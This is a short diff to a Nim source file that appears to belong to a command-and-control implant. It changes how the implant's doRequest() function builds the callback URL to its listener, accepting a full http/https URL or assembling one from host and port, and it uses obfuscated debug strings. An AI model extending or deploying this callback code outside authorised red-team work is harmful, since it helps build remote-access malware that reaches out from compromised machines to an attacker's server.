@@ -63,20 +63,28 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 echo obf("DEBUG: doRequest() - path: ") & path
             
             # Determine target URL based on implantCallbackIp
-            var target : string = toLowerAscii(li.listenerType) & "://"
+            var target : string
             
-            # Smart detection: If implantCallbackIp looks like a domain (contains letters),
-            # don't add port (uses protocol default). If it's an IP, add port.
-            var needsPort = true
-            for c in li.implantCallbackIp:
-                if c in {'a'..'z', 'A'..'Z'}:
-                    needsPort = false
-                    break
-            
-            if needsPort:
-                target = target & li.implantCallbackIp & ":" & li.listenerPort
+            # Check if implantCallbackIp already includes protocol (http:// or https://)
+            if li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
+                # Full URL provided, use as-is
+                target = li.implantCallbackIp
             else:
-                target = target & li.implantCallbackIp
+                # Only host provided, build URL with protocol from config
+                target = toLowerAscii(li.listenerType) & "://"
+                
+                # Smart detection: If implantCallbackIp looks like a domain (contains letters),
+                # don't add port (uses protocol default). If it's an IP, add port.
+                var needsPort = true
+                for c in li.implantCallbackIp:
+                    if c in {'a'..'z', 'A'..'Z'}:
+                        needsPort = false
+                        break
+                
+                if needsPort:
+                    target = target & li.implantCallbackIp & ":" & li.listenerPort
+                else:
+                    target = target & li.implantCallbackIp
             
             target = target & path
 
